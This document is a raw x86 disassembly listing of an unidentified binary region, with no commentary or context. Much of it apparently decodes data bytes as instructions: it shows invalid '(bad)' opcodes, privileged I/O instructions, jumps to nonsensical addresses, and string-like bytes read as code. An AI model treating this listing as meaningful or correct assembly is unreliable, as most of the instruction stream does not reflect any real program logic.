  42a3d0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3d7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3da:	mov    ecx,edi
  42a3dc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a3e2:	jb     0x42a3f3
  42a3e4:	add    BYTE PTR [edi-0x3f],dl
  42a3e7:	add    BYTE PTR [ebp-0x75],cl
  42a3ea:	mov    esi,eax
  42a3ec:	xor    eax,DWORD PTR [eax]
  42a3ee:	mov    al,bh
  42a3f0:	or     eax,0x487284
  42a3f5:	xor    al,cl
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi],dh
  42a406:	enter  0x8500,0x8b
  42a40a:	add    ah,bl
  42a40c:	add    BYTE PTR [eax],al
  42a40e:	inc    ebp
  42a40f:	(bad)  
  42a410:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a417:	mov    esi,DWORD PTR [edx-0x4]
  42a41a:	add    bh,cl
  42a41c:	dec    ebp
  42a41d:	mov    dh,0x8b
  42a41f:	add    esi,DWORD PTR [ebx]
  42a421:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a427:	add    BYTE PTR [eax],al
  42a429:	mov    eax,ecx
  42a42b:	loopne 0x42a47a
  42a42d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a433:	dec    eax
  42a434:	or     eax,0x8b7232
  42a439:	in     al,0xc1
  42a43b:	or     DWORD PTR [ebp-0x31],ecx
  42a43e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a445:	xor    dh,BYTE PTR [edx-0x75]
  42a448:	add    al,dh
  42a44a:	enter  0x4f09,0xcf
  42a44e:	inc    ebp
  42a44f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a455:	or     al,BYTE PTR ds:0xe4728b
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a465:	cmp    dh,BYTE PTR [edx+0xf]
  42a468:	add    bl,dl
  42a46a:	rol    DWORD PTR [eax],0x4d
  42a46d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a473:	(bad)  
  42a474:	or     eax,0x487284
  42a479:	xor    al,cl
  42a47b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a47e:	mov    ecx,DWORD PTR [ecx]
  42a480:	xor    ecx,edi
  42a482:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a489:	xor    cl,al
  42a48b:	mov    ecx,DWORD PTR [edi]
  42a48d:	fadd   QWORD PTR [ebp+0x9]
  42a490:	call   0xffcf9f64
  42a495:	dec    eax
  42a496:	dec    ebp
  42a497:	xor    bh,BYTE PTR [ebx]
  42a499:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a49d:	loopne 0x42a49b
  42a49f:	or     edi,eax
  42a4a1:	iret   
  42a4a2:	ret    
  42a4a3:	mov    WORD PTR [ebp+0x4c],es
  42a4a6:	mov    esi,DWORD PTR [edx]
  42a4a8:	call   0x84526be7
  42a4ad:	(bad)  
  42a4ae:	cwde   
  42a4af:	add    BYTE PTR [edx],dh
  42a4b1:	mov    esi,DWORD PTR [ebx]
  42a4b3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4b9:	test   BYTE PTR [ebx],dh
  42a4bb:	dec    eax
  42a4bc:	add    esi,DWORD PTR [edx]
  42a4be:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4c4:	dec    edi
  42a4c6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4cd:	xor    al,BYTE PTR [ebx]
  42a4cf:	mov    edi,DWORD PTR [ebx]
  42a4d1:	in     al,0x75
  42a4d3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4d9:	dec    eax
  42a4da:	xor    esi,DWORD PTR [edx]
  42a4dc:	lea    ecx,[edx]
  42a4de:	or     BYTE PTR [ebx+0x900f072],cl
  42a4e4:	ja     0x42a4b5
  42a4e6:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a4ed:	cmp    ch,al
  42a4ef:	jne    0x42a4e4
  42a4f1:	mov    edi,edi
  42a4f3:	fadd   QWORD PTR [ebp+0x0]
  42a4f6:	mov    eax,edi
  42a4f8:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a4ff:	mov    edx,DWORD PTR [ebx]
  42a501:	in     al,0x45
  42a503:	or     DWORD PTR [ebx],esi
  42a505:	iret   
  42a506:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a50d:	xor    dl,BYTE PTR [eax-0x75]
  42a510:	sbb    al,ah
  42a512:	dec    DWORD PTR [ecx]
  42a514:	mov    ecx,edi
  42a516:	in     al,dx
  42a517:	mov    eax,es
  42a519:	dec    eax
  42a51a:	mov    DWORD PTR [edx],esi
  42a51c:	fmul   QWORD PTR [edx]
  42a51e:	jne    0x42a4ab
  42a520:	(bad)  
  42a521:	(bad)  
  42a523:	or     DWORD PTR [ebp-0x31],eax
  42a526:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a52d:	cmp    bh,bh
  42a52f:	jne    0x42a576
  42a531:	lea    ecx,[ebx-0x38372750]
  42a537:	inc    ebx
  42a539:	mov    eax,ecx
  42a53b:	mov    eax,0xa00c111
  42a540:	jne    0x42a587
  42a542:	mov    esi,DWORD PTR [ebx]
  42a544:	test   al,0x3
  42a546:	inc    ebp
  42a547:	mov    DWORD PTR [eax-0xc],edx
  42a54a:	fiadd  WORD PTR [ebp-0x1]
  42a54d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a553:	jb     0x42a556
  42a555:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a55b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a561:	retf   
  42a562:	mov    edx,ecx
  42a564:	adc    al,0x84
  42a566:	(bad)  
  42a567:	std    
  42a568:	ret    
  42a569:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a56f:	hlt    
  42a570:	rol    edi,0x82
  42a573:	ret    
  42a574:	cld    
  42a575:	enter  0x11ff,0x45
  42a579:	inc    ebp
  42a57a:	pop    edi
  42a57b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a57e:	ret    0xc7
  42a581:	test   BYTE PTR [ebx+0x45325198],cl
  42a587:	jmp    0x42a514
  42a589:	push   0x8
  42a58b:	call   DWORD PTR [esi]
  42a58d:	in     al,dx
  42a58e:	add    BYTE PTR [ebp+0x1],0x50
  42a592:	add    bl,ah
  42a594:	add    bh,bh
  42a596:	icebp  
  42a597:	mov    ecx,DWORD PTR [eax]
  42a599:	cld    
  42a59a:	pop    es
  42a59b:	dec    ebp
  42a59c:	shl    DWORD PTR [ebx],0x72
  42a59f:	add    eax,DWORD PTR [eax]
  42a5a1:	cmp    edx,ecx
  42a5a3:	je     0x42a5b5
  42a5a5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5a8:	inc    edi
  42a5aa:	or     al,0xc3
  42a5ac:	jmp    FWORD PTR [edx-0x18]
  42a5af:	(bad)  
  42a5b0:	sti    
  42a5b1:	cwde   
  42a5b2:	(bad)  
  42a5b3:	call   0xffa09ebe
  42a5b8:	or     al,0x45
  42a5ba:	push   ebp
  42a5bb:	sub    esp,0x18
  42a5be:	push   ebx
  42a5bf:	inc    ebp
  42a5c0:	mov    edi,edi
  42a5c2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5c9:	test   al,0x50
  42a5cb:	inc    ebp
  42a5cc:	push   ecx
  42a5cd:	push   eax
  42a5ce:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5d4:	add    ah,bh
  42a5d6:	(bad)  
  42a5d7:	dec    ebp
  42a5d8:	add    DWORD PTR [ebx],esi
  42a5da:	inc    ebp
  42a5db:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a5e1:	push   0xffffff8b
  42a5e3:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a5e9:	add    eax,DWORD PTR [ecx]
  42a5eb:	or     BYTE PTR [eax],al
  42a5ed:	call   0xff849df2
  42a5f2:	mov    eax,DWORD PTR [ebp+0x14]
  42a5f5:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a5fb:	inc    ebp
  42a5fc:	dec    ecx
  42a5fd:	add    ebp,DWORD PTR [edx+0x14]
  42a600:	push   0x8b3045
  42a605:	call   0x33acf37a
  42a60a:	inc    DWORD PTR [ebx]
  42a60c:	mov    DWORD PTR [edi],ecx
  42a60e:	mov    eax,ecx
  42a610:	or     BYTE PTR [ebp-0x3d],cl
  42a613:	cmp    eax,edi
  42a615:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a61a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a620:	adc    al,0xc9
  42a622:	inc    ebp
  42a623:	adc    BYTE PTR [eax+0x55],dl
  42a626:	jne    0x42a614
  42a628:	call   0xff53a5b8
  42a62d:	dec    ebp
  42a62e:	inc    ebp
  42a62f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a635:	add    BYTE PTR [ebx],bh
  42a637:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a63b:	push   eax
  42a63c:	or     al,0x51
  42a63e:	dec    ebp
  42a63f:	xor    DWORD PTR [ebx],0xf320398
  42a645:	cmp    eax,DWORD PTR [ebp+0x74]
  42a648:	mov    edi,edi
  42a64a:	pop    edi
  42a64b:	adc    BYTE PTR [ebx+0x75],bl
  42a64e:	ret    0x50
  42a651:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a655:	(bad)  
  42a656:	clc    
  42a657:	mov    esp,ebp
  42a659:	pop    ecx
  42a65a:	mov    ecx,0xf80085c2
  42a65f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a662:	push   esi
  42a663:	push   esi
  42a664:	(bad)  
  42a665:	lock add DWORD PTR [ebp+0x44],eax
  42a669:	mov    edx,DWORD PTR [eax]
  42a66b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a66f:	or     BYTE PTR [eax+0x7],dl
  42a672:	push   ecx
  42a673:	ret    
  42a674:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a67a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a680:	or     al,0x80
  42a682:	jge    0x42a685
  42a684:	mov    DWORD PTR [eax],eax
  42a686:	and    al,0x8
  42a688:	cmp    DWORD PTR [ebp+0x10],eax
  42a68b:	mov    edx,DWORD PTR [esi]
  42a68d:	xchg   esp,eax
  42a68e:	dec    esp
  42a68f:	add    BYTE PTR [eax],dl
  42a691:	mov    ecx,edx
  42a693:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a697:	dec    ebp
  42a698:	into   
  42a699:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a69f:	mov    edx,DWORD PTR [eax+0x14]
  42a6a2:	das    
  42a6a3:	add    al,0x45
  42a6a5:	add    BYTE PTR [ebp+0x0],dh
  42a6a8:	mov    edi,edi
  42a6aa:	and    al,0x50
  42a6ac:	mov    eax,DWORD PTR [eax]
  42a6ae:	and    al,0xd1
  42a6b0:	xor    eax,DWORD PTR [esi]
  42a6b2:	lea    eax,[ebp+0x8]
  42a6b5:	xor    esi,DWORD PTR [edx+0x3]
  42a6b8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6be:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6c4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ce:	cmp    edi,edi
  42a6d0:	pushf  
  42a6d1:	mov    edi,edi
  42a6d3:	or     BYTE PTR [esi+ecx*1],cl
  42a6d6:	jne    0x42a69b
  42a6d8:	call   0xba6a4
  42a6dd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a6e1:	mov    ebx,DWORD PTR [eax]
  42a6e3:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a6e7:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a6ef:	pop    esi
  42a6f0:	dec    ecx
  42a6f2:	and    al,0x10
  42a6f4:	call   DWORD PTR [ebp+0x24]
  42a6f7:	in     al,dx
  42a6f8:	call   0xffc6a5e1
  42a6fd:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a701:	pushf  
  42a702:	pop    esi
  42a703:	mov    ebp,esp
  42a705:	and    al,0xc2
  42a707:	push   edi
  42a708:	add    BYTE PTR [ecx+0x3a],al
  42a70b:	mov    DWORD PTR [ebp+0x24],esi
  42a70e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a714:	dec    DWORD PTR [eax]
  42a716:	and    al,0x7
  42a718:	(bad)  
  42a719:	cli    
  42a71a:	and    al,0x98
  42a71c:	or     BYTE PTR [edx],dh
  42a71e:	sbb    BYTE PTR [ebx],al
  42a720:	adc    al,0x89
  42a722:	jmp    DWORD PTR [esp]
  42a725:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a72b:	adc    al,0x8
  42a72d:	dec    ebp
  42a72e:	adc    BYTE PTR [ebp-0x7c],dh
  42a731:	mov    esi,DWORD PTR [edx]
  42a733:	and    al,0x24
  42a735:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a73b:	add    edi,eax
  42a73d:	pcmpeqb mm1,mm2
  42a740:	jmp    0x42a78e
  42a742:	dec    DWORD PTR [eax]
  42a744:	je     0x42a731
  42a746:	mov    edi,DWORD PTR [ecx]
  42a748:	pop    ebp
  42a749:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a74d:	cwde   
  42a74e:	mov    DWORD PTR [eax-0x8],ebp
  42a751:	jge    0x42a7bb
  42a753:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a759:	jl     0x42a7a5
  42a75b:	adc    BYTE PTR [eax],al
  42a75d:	pop    esp
  42a75e:	cmp    al,0x10
  42a760:	add    BYTE PTR [ecx+0x41],dl
  42a763:	adc    BYTE PTR [eax],al
  42a765:	test   al,0x21
  42a767:	adc    BYTE PTR [eax],al
  42a769:	cs jbe 0x42a77c
  42a76c:	add    BYTE PTR [edx+0xe],ch
  42a76f:	adc    BYTE PTR [eax],al
  42a771:	clc    
  42a772:	pusha  
  42a773:	adc    BYTE PTR [eax],al
  42a775:	jp     0x42a7b8
  42a777:	adc    BYTE PTR [eax],al
  42a779:	mov    ds:0x88001059,eax
  42a77e:	pop    ebp
  42a77f:	adc    BYTE PTR [eax],al
  42a781:	inc    ax
  42a783:	adc    BYTE PTR [eax],al
  42a785:	pop    ecx
  42a786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a787:	inc    edx
  42a788:	add    BYTE PTR [ebp-0x59],bl
  42a78b:	inc    edx
  42a78c:	add    BYTE PTR [ecx-0x59],ah
  42a78f:	inc    edx
  42a790:	add    BYTE PTR [ebp-0x59],ah
  42a793:	inc    edx
  42a794:	add    BYTE PTR [ecx-0x59],ch
  42a797:	inc    edx
  42a798:	add    BYTE PTR [ebp-0x59],ch
  42a79b:	inc    edx
  42a79c:	add    BYTE PTR [ecx-0x59],dh
  42a79f:	inc    edx
  42a7a0:	add    BYTE PTR [ebp-0x59],dh
  42a7a3:	inc    edx
  42a7a4:	add    BYTE PTR [ecx-0x59],bh
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x2effbd59],al
  42a7b2:	cmp    BYTE PTR [eax],dl
  42a7b4:	add    BYTE PTR [edi],dl
  42a7b6:	xor    BYTE PTR [eax],dl
  42a7b8:	add    BYTE PTR [eax],al
  42a7ba:	pop    ds
  42a7bb:	adc    BYTE PTR [eax],al
  42a7bd:	(bad)  
  42a7be:	adc    BYTE PTR ds:[eax],al
  42a7c1:	in     eax,0x19
  42a7c3:	adc    BYTE PTR [eax],al
  42a7c5:	bound  ebx,QWORD PTR [ecx]
  42a7c7:	adc    BYTE PTR [eax],al
  42a7c9:	shl    BYTE PTR [edi+0x10],1
  42a7cc:	add    BYTE PTR [edi-0x4effefa9],al
  42a7d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7d3:	inc    edx
  42a7d4:	add    BYTE PTR [ebp-0x46ffbd59],dh
  42a7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7db:	inc    edx
  42a7dc:	add    BYTE PTR [ebp-0x3effbd59],bh
  42a7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e3:	inc    edx
  42a7e4:	add    ch,al
  42a7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e7:	inc    edx
  42a7e8:	add    cl,cl
  42a7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7eb:	inc    edx
  42a7ec:	add    ch,cl
  42a7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ef:	inc    edx
  42a7f0:	add    dl,ah
  42a7f2:	adc    BYTE PTR ds:[eax],al
  42a7f5:	ds pop ebp
  42a7f7:	adc    BYTE PTR [eax],al
  42a7f9:	add    BYTE PTR [esi+0x10],ah
  42a7fc:	add    al,ch
  42a7fe:	pop    eax
  42a7ff:	adc    BYTE PTR [eax],al
  42a801:	cdq    
  42a802:	outs   dx,BYTE PTR ds:[esi]
  42a803:	adc    BYTE PTR [eax],al
  42a805:	ja     0x42a867
  42a807:	adc    BYTE PTR [eax],al
  42a809:	jne    0x42a842
  42a80b:	adc    BYTE PTR [eax],al
  42a80d:	arpl   WORD PTR [eax+edx*1],bx
  42a810:	add    cl,dh
  42a812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a813:	inc    edx
  42a814:	add    ch,dh
  42a816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a817:	inc    edx
  42a818:	add    cl,bh
  42a81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81b:	inc    edx
  42a81c:	add    ch,bh
  42a81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81f:	inc    edx
  42a820:	add    BYTE PTR [ecx],al
  42a822:	test   al,0x42
  42a824:	add    BYTE PTR ds:0x90042a8,al
  42a82a:	test   al,0x42
  42a82c:	add    BYTE PTR ds:0x5c0042a8,cl
  42a832:	adc    DWORD PTR [eax],edx
  42a834:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a83b:	adc    BYTE PTR [eax],al
  42a83d:	and    al,0x30
  42a83f:	adc    BYTE PTR [eax],al
  42a841:	ret    
  42a842:	pop    edi
  42a843:	adc    BYTE PTR [eax],al
  42a845:	loopne 0x42a8ad
  42a847:	adc    BYTE PTR [eax],al
  42a849:	add    eax,0xd400105b
  42a84e:	aas    
  42a84f:	adc    BYTE PTR [eax],al
  42a851:	xor    DWORD PTR [eax-0x57caffbe],ebp
  42a857:	inc    edx
  42a858:	add    BYTE PTR [ecx],bh
  42a85a:	test   al,0x42
  42a85c:	add    BYTE PTR ds:0x410042a8,bh
  42a862:	test   al,0x42
  42a864:	add    BYTE PTR [ebp-0x58],al
  42a867:	inc    edx
  42a868:	add    BYTE PTR [ecx-0x58],cl
  42a86b:	inc    edx
  42a86c:	add    BYTE PTR [ebp-0x58],cl
  42a86f:	inc    edx
  42a870:	add    dh,dl
  42a872:	sbb    eax,0x10f00010
  42a877:	adc    BYTE PTR [eax],al
  42a879:	inc    ecx
  42a87a:	bound  edx,QWORD PTR [eax]
  42a87c:	add    BYTE PTR [ebx+eax*1],ah
  42a87f:	adc    BYTE PTR [eax],al
  42a881:	jecxz  0x42a8e6
  42a883:	adc    BYTE PTR [eax],al
  42a885:	pushf  
  42a886:	xor    DWORD PTR [eax],edx
  42a888:	add    BYTE PTR [ecx],al
  42a88a:	or     dl,BYTE PTR [eax]
  42a88c:	add    dh,dl
  42a88e:	inc    edi
  42a88f:	adc    BYTE PTR [eax],al
  42a891:	jno    0x42a83b
  42a893:	inc    edx
  42a894:	add    BYTE PTR [ebp-0x58],dh
  42a897:	inc    edx
  42a898:	add    BYTE PTR [ecx-0x58],bh
  42a89b:	inc    edx
  42a89c:	add    BYTE PTR [ebp-0x58],bh
  42a89f:	inc    edx
  42a8a0:	add    BYTE PTR [ecx-0x7affbd58],al
  42a8a6:	test   al,0x42
  42a8a8:	add    BYTE PTR [ecx-0x72ffbd58],cl
  42a8ae:	test   al,0x42
  42a8b0:	add    BYTE PTR [ebx+0x32],al
  42a8b3:	xor    dh,BYTE PTR ds:0x5a52345f
  42a8b9:	push   esp
  42a8ba:	xor    BYTE PTR [esi],dh
  42a8bc:	add    BYTE PTR [ecx+0x36],cl
  42a8bf:	push   eax
  42a8c0:	pop    edi
  42a8c1:	ss inc ebx
  42a8c3:	ss pop edx
  42a8c5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8c8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8cc:	pop    edi
  42a8cd:	dec    esi
  42a8ce:	dec    esp
  42a8cf:	dec    eax
  42a8d0:	xor    esi,DWORD PTR [edx]
  42a8d2:	pop    edi
  42a8d3:	xor    al,0x4b
  42a8d5:	add    BYTE PTR [eax+0x49],cl
  42a8d8:	push   ebp
  42a8d9:	xor    al,0x5f
  42a8db:	dec    esp
  42a8dc:	inc    edx
  42a8dd:	dec    ecx
  42a8de:	cmp    DWORD PTR [edi+ebx*2],esi
  42a8e1:	pop    ecx
  42a8e2:	inc    edi
  42a8e3:	add    BYTE PTR [eax+0x50],bl
  42a8e6:	dec    eax
  42a8e7:	pop    edi
  42a8e8:	push   ebp
  42a8e9:	push   ecx
  42a8ea:	inc    edi
  42a8eb:	xor    cl,BYTE PTR [edx+0x38]
  42a8ee:	push   esi
  42a8ef:	add    BYTE PTR [ebx+0x4a],al
  42a8f2:	push   edx
  42a8f3:	pop    edi
  42a8f4:	dec    edi
  42a8f5:	dec    eax
  42a8f6:	dec    edi
  42a8f7:	dec    edi
  42a8f8:	dec    edx
  42a8f9:	add    BYTE PTR [ecx+0x52],al
  42a8fc:	cmp    DWORD PTR [edi+0x56],ebx
  42a8ff:	aaa    
  42a900:	dec    esp
  42a901:	cmp    DWORD PTR [ebx+0x5f],eax
  42a904:	push   edx
  42a905:	inc    esp
  42a906:	add    BYTE PTR [ecx+0x37],bl
  42a909:	inc    esp
  42a90a:	pop    edi
  42a90b:	dec    ecx
  42a90c:	xor    esi,DWORD PTR [edi]
  42a90e:	xor    DWORD PTR [edi+0x49],ebx
  42a911:	push   esp
  42a912:	xor    eax,DWORD PTR [eax]
  42a914:	push   edx
  42a915:	xor    BYTE PTR [eax+0x5f],bl
  42a918:	dec    eax
  42a919:	push   edi
  42a91a:	inc    esi
  42a91b:	xor    DWORD PTR [edi+0x5f],edx
  42a91e:	cmp    BYTE PTR [ebx+0x37],dl
  42a921:	add    BYTE PTR [esi+0x42],dl
  42a924:	dec    ecx
  42a925:	xor    ebx,DWORD PTR [edi+0x45]
  42a928:	xor    BYTE PTR [ebp+0x5f],cl
  42a92b:	xor    al,0x34
  42a92d:	xor    BYTE PTR [edx+0x5f],cl
  42a930:	inc    edi
  42a931:	add    BYTE PTR [edx+0x57],dl
  42a934:	xor    ebx,DWORD PTR [edi+0x31]
  42a937:	dec    edx
  42a938:	push   edi
  42a939:	xor    eax,0x4d435f
  42a93e:	dec    ecx
  42a93f:	xor    eax,0x36365f39
  42a944:	dec    eax
  42a945:	xor    BYTE PTR [eax],al
  42a947:	dec    edi
  42a948:	inc    ebx
  42a949:	push   edi
  42a94a:	pop    edi
  42a94b:	inc    edi
  42a94c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a951:	add    BYTE PTR [edx+0x58],al
  42a954:	inc    edi
  42a955:	ss pop edi
  42a957:	push   esi
  42a958:	inc    ebx
  42a959:	dec    esi
  42a95a:	inc    esp
  42a95b:	add    BYTE PTR [edi+0x4d],cl
  42a95e:	inc    edi
  42a95f:	xor    ebx,DWORD PTR [edi+0x34]
  42a962:	dec    esi
  42a963:	pop    edx
  42a964:	cmp    BYTE PTR [edi+0x58],bl
  42a967:	cmp    BYTE PTR [eax],al
  42a969:	push   edx
  42a96a:	pop    eax
  42a96b:	push   ecx
  42a96c:	pop    edi
  42a96d:	dec    esp
  42a96e:	push   edx
  42a96f:	dec    ecx
  42a970:	dec    edi
  42a971:	inc    esp
  42a972:	pop    edi
  42a973:	dec    edi
  42a974:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a978:	push   eax
  42a979:	inc    ebp
  42a97a:	pop    edi
  42a97b:	xor    eax,0x565f3945
  42a980:	add    BYTE PTR [edi+0x4e],al
  42a983:	push   esi
  42a984:	pop    edi
  42a985:	inc    edi
  42a986:	push   esp
  42a987:	dec    eax
  42a988:	xor    dh,BYTE PTR [ecx]
  42a98a:	pop    edi
  42a98b:	dec    edi
  42a98c:	xor    eax,DWORD PTR ss:[eax]
  42a98f:	inc    esp
  42a990:	inc    ebp
  42a991:	dec    ecx
  42a992:	pop    edi
  42a993:	push   edx
  42a994:	dec    eax
  42a995:	xor    al,0x48
  42a997:	dec    ecx
  42a998:	ss pop edi
  42a99a:	aaa    
  42a99b:	aaa    
  42a99c:	dec    ecx
  42a99d:	dec    ebp
  42a99e:	add    BYTE PTR [eax+0x54],cl
  42a9a1:	ss pop edi
  42a9a3:	inc    esi
  42a9a4:	inc    edx
  42a9a5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9a8:	dec    esi
  42a9a9:	ss dec edx
  42a9ab:	pop    edi
  42a9ac:	dec    ecx
  42a9ad:	dec    esp
  42a9ae:	inc    edi
  42a9af:	inc    esp
  42a9b0:	dec    eax
  42a9b1:	xor    BYTE PTR [eax],bh
  42a9b3:	xor    eax,0x4c344f00
  42a9b8:	xor    esi,DWORD PTR [edi]
  42a9ba:	xor    BYTE PTR [edi+0x44],bl
  42a9bd:	inc    edi
  42a9be:	dec    ebx
  42a9bf:	xor    al,BYTE PTR [ecx+0x43]
  42a9c2:	add    BYTE PTR [edi+0x32],cl
  42a9c5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9c8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9cb:	pop    edx
  42a9cc:	add    BYTE PTR [eax+0x4c],bl
  42a9cf:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9d2:	inc    ecx
  42a9d3:	dec    edx
  42a9d4:	inc    esi
  42a9d5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9d8:	pop    eax
  42a9d9:	inc    edi
  42a9da:	inc    edx
  42a9db:	add    BYTE PTR [eax+0x33],dl
  42a9de:	dec    esi
  42a9df:	pop    edi
  42a9e0:	dec    eax
  42a9e1:	xor    eax,0x485f53
  42a9e6:	dec    ebp
  42a9e7:	xor    BYTE PTR [edx+0x5f],al
  42a9ea:	dec    edx
  42a9eb:	pop    eax
  42a9ec:	push   esp
  42a9ed:	dec    ecx
  42a9ee:	dec    esp
  42a9ef:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42a9f3:	xor    esi,DWORD PTR [eax]
  42a9f5:	pop    edi
  42a9f6:	inc    ecx
  42a9f7:	pop    edx
  42a9f8:	push   ecx
  42a9f9:	pop    edx
  42a9fa:	cmp    DWORD PTR [esi],esi
  42a9fc:	pop    edi
  42a9fd:	dec    eax
  42a9fe:	dec    esp
  42a9ff:	pop    edx
  42aa00:	add    BYTE PTR [ecx+0x57],dl
  42aa03:	pop    ecx
  42aa04:	pop    edi
  42aa05:	push   esi
  42aa06:	xor    al,0x44
  42aa08:	xor    DWORD PTR [eax],edi
  42aa0a:	xor    bl,BYTE PTR [edi+0x39]
  42aa0d:	push   esp
  42aa0e:	push   esp
  42aa0f:	add    BYTE PTR [esi+0x0],dl
  42aa12:	dec    edi
  42aa13:	add    BYTE PTR [edi+0x0],al
  42aa16:	add    BYTE PTR ss:[edi+0x0],bl
  42aa1a:	dec    edi
  42aa1b:	add    BYTE PTR [edx+0x0],bl
  42aa1e:	inc    ebp
  42aa1f:	add    BYTE PTR [eax],dh
  42aa21:	add    BYTE PTR [ebp+0x0],al
  42aa24:	xor    BYTE PTR [eax],al
  42aa26:	pop    edi
  42aa27:	add    BYTE PTR [eax],dh
  42aa29:	add    BYTE PTR ds:0x4f000000,dh
  42aa2f:	add    BYTE PTR ds:0x5f005700,dh
  42aa35:	add    BYTE PTR [edi],dh
  42aa37:	add    BYTE PTR [ebx+0x0],dl
  42aa3a:	push   ebp
  42aa3b:	add    BYTE PTR [edi+0x0],al
  42aa3e:	xor    al,0x0
  42aa40:	pop    edi
  42aa41:	add    BYTE PTR [ecx+0x0],dl
  42aa44:	inc    esp
  42aa45:	add    BYTE PTR [eax],al
  42aa47:	add    BYTE PTR [edx+0x0],dl
  42aa4a:	push   esp
  42aa4b:	add    BYTE PTR ds:0x52005f00,dh
  42aa51:	add    BYTE PTR [edi+0x0],dl
  42aa54:	xor    al,BYTE PTR [eax]
  42aa56:	xor    al,BYTE PTR [eax]
  42aa58:	xor    BYTE PTR [eax],al
  42aa5a:	xor    BYTE PTR [eax],al
  42aa5c:	pop    edi
  42aa5d:	add    BYTE PTR [esi],dh
  42aa5f:	add    BYTE PTR [eax],al
  42aa61:	add    BYTE PTR [eax+0x0],cl
  42aa64:	inc    ebp
  42aa65:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa69:	add    BYTE PTR [edi+0x0],bl
  42aa6c:	dec    edx
  42aa6d:	add    BYTE PTR [edx],dh
  42aa6f:	add    BYTE PTR [edi],dh
